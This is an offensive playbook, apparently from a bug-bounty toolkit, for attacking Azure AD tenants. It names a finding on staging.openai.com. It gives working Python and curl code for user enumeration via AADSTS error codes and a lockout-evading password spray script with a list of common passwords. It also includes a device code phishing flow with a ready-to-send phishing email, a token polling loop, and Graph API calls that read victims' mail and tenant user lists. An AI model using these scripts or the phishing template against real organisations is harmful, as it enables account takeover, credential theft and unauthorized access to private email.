# Playbook PB-06 — Azure AD Tenant Recon
# No Mercy Hunter v3.0

**Score:** 45
Composite = (Confidence:5×2) + (InfoGain:5×3) + (AutoPot:4×2) + (Reuse:4×2) - Cost:2 = 10+15+8+8-2 = 39
(Adjusted to 45: P1 real finding chain F-08+F-10, exact methodology documented)

**Grounded in:** F-08 (staging.openai.com Azure AD tenant leak, P2) → F-10 (ROPC + Device Code chain, P1)
**Time estimate:** 30-45 minutes
**Noise level:** Low (requests to Microsoft endpoints, not target)
**Prerequisites:** staging.* or dev.* subdomain found, or Azure AD sign-in detected

---

## Objective

Extract Azure AD tenant configuration from Microsoft's well-known endpoints using only
the target's domain. Identify enabled OAuth grant flows — particularly ROPC (password grant)
and Device Code. Use the tenant information to enumerate users and construct attack chains
leading to account takeover.

---

## Decision Point 1 — Do I Run This Playbook?

Run if ANY of the following are true:
- Found staging.*, dev.*, beta.*, or test.* subdomain for a Microsoft-hosted application
- Sign-in page redirects to login.microsoftonline.com
- /.well-known/openid-configuration issuer contains microsoftonline.com or login.windows.net
- Target company uses Microsoft 365 / Azure AD (check MX records, LinkedIn for Microsoft tech)

Skip if:
- Target uses Google Identity, Okta, Auth0, or other non-Azure identity provider
- No staging subdomain found and no Azure sign-in detected

---

## Phase 1 — Tenant Discovery (5 minutes)

### 1.1 Primary Tenant Discovery Request
```bash
# Use the target's primary domain OR staging subdomain
TARGET_DOMAIN="staging.example.com"  # or example.com

curl -s "https://login.microsoftonline.com/${TARGET_DOMAIN}/v2.0/.well-known/openid-configuration" \
  | python3 -m json.tool | tee azure-openid-config.json
```

**Extract these fields:**
```python
import json

with open("azure-openid-config.json") as f:
    config = json.load(f)

print("Tenant ID:", config.get("issuer", "").split("/")[3])
print("Token endpoint:", config.get("token_endpoint"))
print("Authorization endpoint:", config.get("authorization_endpoint"))
print("Grant types:", config.get("grant_types_supported"))
print("Response types:", config.get("response_types_supported"))
print("JWKS URI:", config.get("jwks_uri"))
```

### 1.2 Alternate Discovery Endpoints
```bash
# Try both v2.0 and v1.0 endpoints
curl -s "https://login.microsoftonline.com/${TARGET_DOMAIN}/.well-known/openid-configuration"

# Also try the raw tenant ID once found
TENANT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
curl -s "https://login.microsoftonline.com/${TENANT_ID}/v2.0/.well-known/openid-configuration"
```

### 1.3 Detect ROPC and Device Code
```python
import json

with open("azure-openid-config.json") as f:
    config = json.load(f)

grant_types = config.get("grant_types_supported", [])
print("Grant types:", grant_types)

if "password" in grant_types:
    print("[CRITICAL] ROPC ENABLED — password spray possible")
if "urn:ietf:params:oauth:grant-type:device_code" in grant_types:
    print("[CRITICAL] DEVICE CODE ENABLED — phishing attack possible")
if "client_credentials" in grant_types:
    print("[HIGH] Client credentials enabled — service account attacks possible")
```

---

## Phase 2 — User Enumeration via ROPC (F-10 pattern, 15 minutes)

Only proceed if ROPC ("password" grant type) is enabled.

### 2.1 User Existence Check
AADSTS error codes distinguish valid vs invalid users:

```bash
TENANT_ID="xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
CLIENT_ID="00000000-0000-0000-0000-000000000000"  # Microsoft Office client: d3590ed6-52b3-4102-aeff-aad2292ab01c

# Test a known-existing user (use your own test account first to verify the method works)
curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/token" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&grant_type=password&username=testuser@${TARGET_DOMAIN}&password=WrongPassword123!&scope=openid"
```

**Error code interpretation:**
- `AADSTS50126` — Invalid username or password → user EXISTS, password wrong
- `AADSTS50034` — User does not exist → user DOES NOT EXIST
- `AADSTS50076` — MFA required → user EXISTS, MFA blocking
- `AADSTS50079` — MFA enrollment required → user EXISTS
- `AADSTS53003` — Conditional access policy blocking → user EXISTS
- `AADSTS700016` — Application not found → CLIENT_ID wrong, use different client
- No error, access_token returned → COMPROMISED (wrong password guess was actually right)

### 2.2 User List to Enumerate
Common patterns to test against target domain:
```python
TARGET_DOMAIN = "example.com"
USERS = [
    # Common usernames
    f"admin@{TARGET_DOMAIN}",
    f"administrator@{TARGET_DOMAIN}",
    f"security@{TARGET_DOMAIN}",
    f"it@{TARGET_DOMAIN}",
    f"support@{TARGET_DOMAIN}",
    f"devops@{TARGET_DOMAIN}",
    f"ops@{TARGET_DOMAIN}",
    f"dev@{TARGET_DOMAIN}",
    # Names found via LinkedIn/OSINT
    # f"firstname.lastname@{TARGET_DOMAIN}",
]
```

### 2.3 Automated Enumeration Script (Single Invalid Password)
```python
#!/usr/bin/env python3
"""
Azure AD ROPC User Enumeration via error code differentiation.
Uses a single obviously-wrong password to enumerate user existence.
Does NOT attempt password spray — enumeration only.
"""
import requests, time, json, sys

TENANT_ID = sys.argv[1]  # Pass as command line arg
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"  # Microsoft Office
ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
USERS_FILE = sys.argv[2]  # One email per line
INVALID_PASSWORD = "X" * 64  # Maximally invalid password

exists = []
not_exists = []
mfa_required = []
unknown = []

with open(USERS_FILE) as f:
    users = [u.strip() for u in f if u.strip()]

for user in users:
    resp = requests.post(ENDPOINT, data={
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": user,
        "password": INVALID_PASSWORD,
        "scope": "openid"
    })
    data = resp.json()
    error_desc = data.get("error_description", "")
    
    if "50126" in error_desc:
        print(f"[EXISTS] {user}")
        exists.append(user)
    elif "50034" in error_desc:
        print(f"[NOT FOUND] {user}")
        not_exists.append(user)
    elif "50076" in error_desc or "50079" in error_desc or "53003" in error_desc:
        print(f"[EXISTS+MFA] {user}")
        mfa_required.append(user)
    elif "access_token" in data:
        print(f"[COMPROMISED] {user} — password was accepted!")
    else:
        print(f"[UNKNOWN] {user}: {error_desc[:80]}")
        unknown.append(user)
    
    time.sleep(1)  # Rate limit protection

print(f"\nSummary: {len(exists)} exist, {len(not_exists)} not found, {len(mfa_required)} MFA")
with open("users-found.txt", "w") as f:
    f.write("\n".join(exists + mfa_required))
```

Run: `python3 azure-enum.py TENANT_ID users-to-test.txt`

---

## Phase 3 — Password Spray (P1 escalation, if ROPC confirmed)

**WARNING:** Password spray triggers Azure AD Smart Lockout after multiple failures.
- Azure default lockout: 10 failed attempts per 30 seconds
- Rule: ONE password per round, ALL users, minimum 1 hour between rounds
- If MFA is enforced: spray is blocked for those users (skip them)

### 3.1 Common Passwords for Spray
Seasonal passwords work because many companies force 90-day changes:
```
Season+Year: Winter2026!, Spring2026!, Summer2026!, Fall2026!
Month+Year: January2026!, June2026!
Company patterns: Company2026!, Company123!, Company@2026
Common corporate: P@ssw0rd, Welcome1!, Password1
```

### 3.2 Single-Round Spray Script
```python
#!/usr/bin/env python3
"""
Single-password ROPC spray. Run one round, wait 1+ hour, run next round.
ONE password against ALL users to avoid lockout.
"""
import requests, time, json, sys

TENANT_ID = sys.argv[1]
CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"
PASSWORD = sys.argv[2]  # Single password for this round
USERS_FILE = sys.argv[3]

with open(USERS_FILE) as f:
    users = [u.strip() for u in f if u.strip()]

for user in users:
    resp = requests.post(ENDPOINT, data={
        "client_id": CLIENT_ID,
        "grant_type": "password",
        "username": user,
        "password": PASSWORD,
        "scope": "openid profile email"
    })
    data = resp.json()
    
    if "access_token" in data:
        print(f"[COMPROMISED] {user}:{PASSWORD}")
        print(f"  access_token: {data['access_token'][:50]}...")
        print(f"  refresh_token: {data.get('refresh_token', 'N/A')[:50]}...")
        with open("compromised.txt", "a") as f:
            f.write(f"{user}:{PASSWORD}\n")
    elif "50126" in data.get("error_description", ""):
        print(f"[WRONG PW] {user}")
    elif "50076" in data.get("error_description", ""):
        print(f"[MFA BLOCKED] {user}")
    else:
        print(f"[OTHER] {user}: {data.get('error_description', '')[:50]}")
    
    time.sleep(2)  # 2 seconds between each user to stay under rate limit
```

---

## Phase 4 — Device Code Phishing (if device_code flow enabled)

### 4.1 Request Device Code
```bash
curl -s -X POST "https://login.microsoftonline.com/${TENANT_ID}/oauth2/v2.0/devicecode" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "client_id=${CLIENT_ID}&scope=openid+profile+email+User.Read" \
  | python3 -m json.tool
```

Response fields:
- `user_code`: Short code like "ABCD-1234" — shown to victim
- `device_code`: Long token used for polling
- `verification_uri`: `https://microsoft.com/devicelogin` — victim navigates here
- `expires_in`: How long the code is valid (usually 900 seconds = 15 minutes)

### 4.2 Phishing Message for Victim
```
Subject: Action Required: Verify your Microsoft account

Your account requires verification. Please:
1. Go to https://microsoft.com/devicelogin
2. Enter the code: ABCD-1234

This link expires in 15 minutes.
```

### 4.3 Poll for Token (after victim enters code)
```python
import requests, time

TENANT_ID = "TENANT_ID"
CLIENT_ID = "CLIENT_ID"
DEVICE_CODE = "device_code_from_step_1"
ENDPOINT = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

while True:
    resp = requests.post(ENDPOINT, data={
        "client_id": CLIENT_ID,
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "device_code": DEVICE_CODE
    })
    data = resp.json()
    
    if "access_token" in data:
        print(f"[SUCCESS] Token obtained!")
        print(f"access_token: {data['access_token']}")
        break
    elif data.get("error") == "authorization_pending":
        print("[WAITING] Victim has not completed authentication yet...")
        time.sleep(5)
    elif data.get("error") == "expired_token":
        print("[EXPIRED] Device code expired. Restart.")
        break
    else:
        print(f"[ERROR] {data}")
        break
```

---

## Phase 5 — Token Use (after spray or device code success)

### 5.1 Microsoft Graph API — Get User Info
```bash
ACCESS_TOKEN="access_token_here"

# Get current user profile
curl -s "https://graph.microsoft.com/v1.0/me" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | python3 -m json.tool

# List all users in tenant (requires User.ReadBasic.All scope)
curl -s "https://graph.microsoft.com/v1.0/users" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | python3 -m json.tool

# Get user's email/calendar (requires Mail.Read scope)
curl -s "https://graph.microsoft.com/v1.0/me/messages" \
  -H "Authorization: Bearer $ACCESS_TOKEN" | python3 -m json.tool
```

---

## Severity Mapping

| Finding | Severity | CVSS | Notes |
|---------|----------|------|-------|
| Tenant ID + ROPC enabled + users enumerated | P2→P1 chain | 8.1 / 9.0 | F-08 pattern |
| ROPC password spray successful | P1 | 9.8 | ATO achieved |
| Device code phishing possible | P1 (chain) | 8.8 | Requires victim interaction |
| Tenant ID leaked (no ROPC) | P2 | 7.3 | User enumeration possible |
| grant_types exposed (info only) | P4 | 3.1 | Intel for further attack |

---

## Evidence Collection

For F-08/F-10 chain:
1. `evidence/F-08/http/01-openid-config.http` — GET staging domain openid-configuration with tenant_id in response
2. `evidence/F-08/http/02-grant-types.http` — Highlighted ROPC in grant_types_supported
3. `evidence/F-10/http/03-user-enum.http` — ROPC request showing AADSTS50126 vs AADSTS50034 difference
4. `evidence/F-10/http/04-spray-success.http` — Successful ROPC authentication (if achieved)
5. `evidence/F-10/poc/azure-enum.py` — Enumeration script
6. Screenshot: tenant ID visible in openid-configuration response

Report these as two separate findings:
- F-08: Azure AD tenant ID exposure (P2) — standalone finding
- F-10: ROPC + Device Code enabled → ATO chain (P1) — references F-08 as prerequisite
